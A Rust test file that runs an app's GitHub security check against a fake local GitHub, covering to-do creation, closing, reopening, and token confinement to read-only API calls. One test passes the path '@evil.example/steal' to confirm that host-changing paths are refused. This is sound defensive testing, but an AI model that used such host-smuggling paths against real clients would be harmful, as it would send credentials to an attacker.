//! The GitHub security check against a fake GitHub: findings become
//! to-dos once, fixed ones close with a note, and the token only goes to
//! the API base with `GET`.

use std::sync::{Arc, Mutex};

use axum::extract::State;
use axum::http::{HeaderMap, HeaderValue, Method, StatusCode, Uri};
use axum::response::{IntoResponse, Response};
use axum::routing::get;
use axum::Json;
use serde_json::{json, Value};

use super::*;
use crate::services::domain::github_security::FIXED_NOTE_PREFIX;
use crate::services::gateway::assignments::GatewayAssignment;
use crate::services::remote::{CredentialKind, RemoteConfig};

/// A fake GitHub: Alice, her Backup repo, and the org acme she owns
struct Fake {
    scopes: &'static str,
    two_factor: bool,
    backup_private: bool,
    org_2fa: bool,
    scanning: &'static str,
    protected: bool,
    memberships_hidden: bool,
    rate_limited: bool,
    /// Every request: method, path and query, the Authorization header
    seen: Vec<(Method, String, Option<String>)>,
    /// Requests no route answers
    unexpected: Vec<String>,
}

impl Default for Fake {
    fn default() -> Self {
        Self {
            scopes: "repo, read:org, read:user",
            two_factor: false,
            backup_private: false,
            org_2fa: false,
            scanning: "disabled",
            protected: false,
            memberships_hidden: false,
            rate_limited: false,
            seen: Vec::new(),
            unexpected: Vec::new(),
        }
    }
}

type S = Arc<Mutex<Fake>>;

/// Notes each request's method, path and Authorization header
async fn record(
    State(s): State<S>,
    headers: HeaderMap,
    request: axum::extract::Request,
    next: axum::middleware::Next,
) -> Response {
    let auth = headers
        .get("authorization")
        .and_then(|v| v.to_str().ok())
        .map(str::to_string);
    let path = request
        .uri()
        .path_and_query()
        .map(|p| p.to_string())
        .unwrap_or_default();
    s.lock()
        .unwrap()
        .seen
        .push((request.method().clone(), path, auth));
    next.run(request).await
}

fn with_scopes(fake: &Fake, body: Value) -> Response {
    let mut response = Json(body).into_response();
    response
        .headers_mut()
        .insert("x-oauth-scopes", HeaderValue::from_static(fake.scopes));
    response
}

async fn serve(fake: S) -> String {
    let app = axum::Router::new()
        .route(
            "/user",
            get(|State(s): State<S>| async move {
                let fake = s.lock().unwrap();
                if fake.rate_limited {
                    let mut response = StatusCode::FORBIDDEN.into_response();
                    response
                        .headers_mut()
                        .insert("x-ratelimit-remaining", HeaderValue::from_static("0"));
                    return response;
                }
                with_scopes(
                    &fake,
                    json!({ "login": "alice", "two_factor_authentication": fake.two_factor }),
                )
            }),
        )
        .route(
            "/repos/{owner}/{repo}",
            get(|State(s): State<S>| async move {
                Json(json!({ "private": s.lock().unwrap().backup_private }))
            }),
        )
        .route(
            "/user/memberships/orgs",
            get(|State(s): State<S>| async move {
                if s.lock().unwrap().memberships_hidden {
                    return StatusCode::FORBIDDEN.into_response();
                }
                Json(json!([
                    { "role": "admin", "state": "active", "organization": { "login": "acme" } },
                    { "role": "member", "state": "active", "organization": { "login": "other" } },
                ]))
                .into_response()
            }),
        )
        .route(
            "/orgs/{org}",
            get(|State(s): State<S>| async move {
                let fake = s.lock().unwrap();
                Json(json!({ "two_factor_requirement_enabled": fake.org_2fa, "public_repos": 2 }))
            }),
        )
        .route(
            "/orgs/{org}/repos",
            get(|State(s): State<S>| async move {
                let fake = s.lock().unwrap();
                let security = json!({
                    "secret_scanning": { "status": fake.scanning },
                    "secret_scanning_push_protection": { "status": "enabled" },
                });
                Json(json!([
                    { "name": "web", "private": false, "default_branch": "main",
                      "security_and_analysis": security },
                    { "name": "old", "private": false, "archived": true, "default_branch": "main" },
                ]))
            }),
        )
        .route(
            "/repos/{owner}/{repo}/branches/{branch}",
            get(|State(s): State<S>| async move {
                Json(json!({ "name": "main", "protected": s.lock().unwrap().protected }))
            }),
        )
        .route(
            "/repos/{owner}/{repo}/rules/branches/{branch}",
            get(|| async { Json(json!([])) }),
        )
        .fallback(|State(s): State<S>, uri: Uri| async move {
            s.lock().unwrap().unexpected.push(uri.to_string());
            StatusCode::NOT_FOUND
        })
        .layer(axum::middleware::from_fn_with_state(fake.clone(), record))
        .with_state(fake);
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    format!("http://{addr}")
}

fn signed_in(backup_url: Option<&str>) -> AppState {
    let state = AppState::for_tests(Vec::new());
    state
        .secrets()
        .set(github::TOKEN_ENTRY, r#"{"access_token":"gho_alice"}"#)
        .unwrap();
    if let Some(url) = backup_url {
        nandi_config::update_in(state.nandi_dir(), |config| {
            config.remote = Some(RemoteConfig {
                url: url.to_string(),
                has_credentials: true,
                credential_kind: CredentialKind::Github,
                branch_prefix: "backup".into(),
                user_slug: "alice".into(),
                last_push_at: None,
                last_pull_at: None,
                last_push_commit: None,
            });
        })
        .unwrap();
    }
    state
}

async fn security_todos(state: &AppState) -> Vec<GatewayAssignment> {
    state
        .db()
        .call(|conn| assignments::all_from(conn, TodoSource::SecurityCheck))
        .await
        .unwrap()
}

fn nandi_name(state: &AppState) -> String {
    state
        .store()
        .agent(DEFAULT_AGENT)
        .map(|agent| agent.name().to_string())
        .unwrap_or_else(|_| DEFAULT_AGENT.to_string())
}

fn by_ref<'a>(todos: &'a [GatewayAssignment], source_ref: &str) -> &'a GatewayAssignment {
    todos
        .iter()
        .find(|t| t.source_ref.as_deref() == Some(source_ref))
        .unwrap_or_else(|| panic!("no to-do {source_ref}: {todos:?}"))
}

#[tokio::test]
async fn findings_become_todos_once_and_fixed_ones_close_with_a_note() {
    let fake = Arc::new(Mutex::new(Fake::default()));
    let base = serve(fake.clone()).await;
    let state = signed_in(Some("https://github.com/alice/nandi-backup.git"));

    let first = check_at(&state, &base).await.unwrap();
    assert_eq!(first.findings, 5, "2fa, backup, org 2fa, scanning, branch");
    assert!(first.checked_at.is_some());
    assert_eq!(status(&state), first, "kept for Settings");

    let todos = security_todos(&state).await;
    assert_eq!(todos.len(), 5, "{todos:?}");
    for todo in &todos {
        assert_eq!(todo.kind, TodoKind::Check);
        assert_eq!(todo.status, AssignmentStatus::Open);
        assert_eq!(todo.caller_name, nandi_name(&state), "created by Nandi");
        assert!(
            todo.request.contains("https://github.com/"),
            "{}",
            todo.request
        );
    }
    assert!(by_ref(&todos, "github:user:2fa")
        .request
        .contains("github.com/settings/security"));
    by_ref(&todos, "github:repo:alice/nandi-backup:public-backup");
    by_ref(&todos, "github:org:acme:2fa");
    let scanning = by_ref(&todos, "github:org:acme:secret-scanning");
    assert!(scanning.request.contains("(web)"), "{}", scanning.request);
    by_ref(&todos, "github:org:acme:branch-protection");

    // Checked again, nothing fixed: no new to-dos, none changed
    check_at(&state, &base).await.unwrap();
    assert_eq!(security_todos(&state).await, todos);

    // Alice fixes everything but the org's two-factor rule
    {
        let mut fake = fake.lock().unwrap();
        fake.two_factor = true;
        fake.backup_private = true;
        fake.scanning = "enabled";
        fake.protected = true;
    }
    let after = check_at(&state, &base).await.unwrap();
    assert_eq!(after.findings, 1);
    let todos = security_todos(&state).await;
    let note = fixed_note(chrono::Local::now().date_naive());
    for source_ref in [
        "github:user:2fa",
        "github:repo:alice/nandi-backup:public-backup",
        "github:org:acme:secret-scanning",
        "github:org:acme:branch-protection",
    ] {
        let todo = by_ref(&todos, source_ref);
        assert_eq!(todo.status, AssignmentStatus::Done, "{source_ref}");
        assert_eq!(todo.note.as_deref(), Some(note.as_str()));
        assert!(note.starts_with(FIXED_NOTE_PREFIX));
    }
    assert_eq!(
        by_ref(&todos, "github:org:acme:2fa").status,
        AssignmentStatus::Open,
        "still there: still open"
    );

    // Recorded like other to-do changes, under Nandi's name
    let month = chrono::Utc::now().format("%Y-%m").to_string();
    let decisions = state
        .store()
        .repos()
        .decisions
        .read(&month)
        .unwrap()
        .unwrap_or_default();
    assert_eq!(decisions.matches("- **Decision:** added").count(), 5);
    assert_eq!(decisions.matches("- **Decision:** done").count(), 4);
    let by_nandi = format!("- **Decided by:** {}", nandi_name(&state));
    assert_eq!(decisions.matches(&by_nandi).count(), 9, "{decisions}");

    // Two-factor off again: the to-do Nandi closed opens again
    fake.lock().unwrap().two_factor = false;
    check_at(&state, &base).await.unwrap();
    let todos = security_todos(&state).await;
    assert_eq!(todos.len(), 5, "reopened, not added");
    assert_eq!(
        by_ref(&todos, "github:user:2fa").status,
        AssignmentStatus::Open
    );
}

#[tokio::test]
async fn the_token_goes_only_to_the_api_and_only_reads() {
    let fake = Arc::new(Mutex::new(Fake::default()));
    let base = serve(fake.clone()).await;
    let state = signed_in(Some("git@github.com:alice/nandi-backup.git"));
    check_at(&state, &base).await.unwrap();

    let (seen, unexpected) = {
        let fake = fake.lock().unwrap();
        (fake.seen.clone(), fake.unexpected.clone())
    };
    assert_eq!(unexpected, Vec::<String>::new());
    assert!(!seen.is_empty());
    assert!(
        !seen.iter().any(|(_, path, _)| path.contains("/orgs/other")),
        "only orgs Alice owns are read"
    );
    assert!(seen.len() <= reader::MAX_CALLS);
    for (method, path, auth) in &seen {
        assert_eq!(method, Method::GET, "{path}");
        assert_eq!(auth.as_deref(), Some("Bearer gho_alice"), "{path}");
        assert!(!path.contains("/contents"), "never repository contents");
        assert!(!path.contains("/secrets"), "never secret values");
        assert!(!path.contains("old"), "archived repos are skipped: {path}");
    }
    assert_eq!(reader::API_URL, "https://api.github.com");

    // A path that would change the host is refused before anything is sent
    let api = crate::services::marketplace::github::GitHubApi::new(base, "gho_alice");
    let refused = api
        .send_with_headers(Method::GET, "@evil.example/steal", None)
        .await;
    assert!(refused.is_err());
}

#[tokio::test]
async fn an_old_sign_in_gets_one_todo_to_sign_in_again() {
    let fake = Arc::new(Mutex::new(Fake {
        scopes: "repo",
        two_factor: true,
        memberships_hidden: true,
        ..Fake::default()
    }));
    let base = serve(fake).await;
    let state = signed_in(None);
    let result = check_at(&state, &base).await.unwrap();
    assert_eq!(result.findings, 1);
    let todos = security_todos(&state).await;
    assert_eq!(todos.len(), 1, "{todos:?}");
    let todo = by_ref(&todos, "github:scope:read");
    assert!(
        todo.request.contains("sign in to GitHub again"),
        "{}",
        todo.request
    );
}

#[tokio::test]
async fn a_rate_limit_stops_reading_and_changes_nothing() {
    let fake = Arc::new(Mutex::new(Fake {
        rate_limited: true,
        ..Fake::default()
    }));
    let base = serve(fake.clone()).await;
    let state = signed_in(Some("https://github.com/alice/nandi-backup"));
    let result = check_at(&state, &base).await.unwrap();
    assert_eq!(result.findings, 0);
    assert!(security_todos(&state).await.is_empty());
    assert_eq!(fake.lock().unwrap().seen.len(), 1, "stopped after /user");
}

#[tokio::test]
async fn without_a_sign_in_there_is_nothing_to_check() {
    let state = AppState::for_tests(Vec::new());
    let error = check_at(&state, "http://127.0.0.1:9").await.unwrap_err();
    assert!(error.contains("Sign in to GitHub"), "{error}");
    assert_eq!(status(&state), GithubSecurityStatus::default());
}
